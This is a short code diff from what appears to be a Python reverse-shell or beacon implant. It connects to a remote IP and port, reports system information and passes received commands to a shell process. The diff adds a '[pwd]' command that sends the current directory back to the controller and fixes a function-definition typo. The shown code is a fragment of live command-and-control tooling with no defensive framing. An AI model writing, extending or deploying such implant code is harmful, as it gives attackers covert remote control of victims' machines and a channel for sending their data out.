@@ -341,6 +341,8 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
             elif data == "sysinfo":
                 sys_info = sysinfo()
                 send_data(conn, sys_info)
+            elif "[pwd]" in data:
+                send_data(conn, getcwd())
             else: # otherwise, we pass the received command to a shell process
                 #cmds = data.split()
                 if VERBOSE:
@@ -411,7 +413,7 @@ def beacon_drift(value=30):
         print_info("REMOTE_HOST: {}:{}".format(remote_ip,remote_port))
     return new_interval
 
-def main ():
+def main():
     global BEACON_INTERVAL_SETTING
     global remote_port
     global remote_ip
